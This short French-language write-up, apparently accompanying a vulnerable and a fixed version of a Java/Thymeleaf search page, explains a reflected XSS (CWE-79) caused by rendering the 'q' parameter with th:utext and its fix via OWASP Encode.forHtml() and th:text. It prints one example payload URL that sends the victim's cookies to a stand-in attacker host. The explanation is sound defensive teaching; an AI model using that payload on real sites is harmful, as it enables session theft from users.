# Reflected XSS — CWE-79

La version vulnérable réinjecte le paramètre de requête `q` directement dans la page de résultats via `th:utext` (rendu HTML brut, non échappé). Un lien forgé et envoyé à une victime (`/search?q=<script>document.location='https://attaquant.example/steal?c='+document.cookie</script>`) exécute alors du JavaScript dans son navigateur dès l'ouverture du lien, sans aucune persistance côté serveur.

La version corrigée échappe explicitement la valeur pour le contexte HTML avec `Encode.forHtml()` (OWASP Java Encoder) avant de l'exposer au modèle, et le template utilise `th:text` (échappement automatique de Thymeleaf) plutôt que `th:utext`. Ces deux couches indépendantes garantissent que tout caractère spécial HTML est neutralisé quel que soit le point d'entrée.

**Référence** : CWE-79 (Improper Neutralization of Input During Web Page Generation).
